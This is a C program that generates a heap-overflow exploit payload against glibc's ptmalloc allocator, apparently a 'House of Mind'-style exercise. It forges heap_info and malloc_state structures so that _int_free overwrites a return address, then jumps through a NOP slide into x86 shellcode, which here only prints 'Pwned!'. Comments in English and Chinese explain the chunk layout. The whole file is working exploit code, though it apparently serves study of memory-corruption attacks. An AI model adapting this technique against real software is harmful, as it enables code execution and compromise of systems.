#include <stdio.h>

#define EBPMINUS4  0xFFFFCF9C
#define N          720

// Just prints the Pwned string
unsigned char shellcode[] =
"\xeb\x17\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x06"
"\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x50\x77\x6e\x65"
"\x64\x21\x0a";

int main(void)
{
  int i, j;

  // Some filler for the whole ptr chunk + ptr2's prev_size
  // ptmalloc 的空间复用, 所以这里是 1024+4, 4 为下一个 chunk 的 pre_use
  for (i = 0; i < 1028; i++)
    putchar(0x41);

  // 4+1024+4, 第一个 4 是该 chunk 的 size, 后面 1024+4 为空间复用, 如上.
  for (i = 0; i < N - 3; i++)
  {
    fwrite("\x09\x04\x00\x00", 4, 1, stdout);
    for (j = 0; j < 1028; j++)
      putchar(0x41);
  }

  // heap_info 一定处于该区间内, 所以设置该区域内容全部为需要伪造的 malloc_state 地址
  // malloc_state 地址为 heap_info 的第一个元素
  fwrite("\x09\x04\x00\x00", 4, 1, stdout);
  for (i = 0; i < (1024 / 4); i++)
  {
    putchar((EBPMINUS4 & 0x000000FF) >> 0);
    putchar((EBPMINUS4 & 0x0000FF00) >> 8);
    putchar((EBPMINUS4 & 0x00FF0000) >> 16);
    putchar((EBPMINUS4 & 0xFF000000) >> 24);
  }

  // ptr2's prev_size
  // 当触发 _int_free() 操作会覆盖返回地址为 ptr2 地址, 所以需要把该地址的内容改为, jmp 12 跳到 SHELLCODE 地址, 所以此时的 prev_size 就是 jmp 12.
  fwrite("\xeb\x16\x90\x90", 4, 1, stdout);

  // ptr2's size
  fwrite("\x15\x00\x00\x00", 4, 1, stdout);

  // NOP slide + nextchunk->size
  fwrite("\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x09\x00\x00\x00\x90\x90\x90\x90", 20, 1, stdout);

  // shellcode at the end
  fwrite(shellcode, sizeof(shellcode), 1, stdout);

  return 0;
}
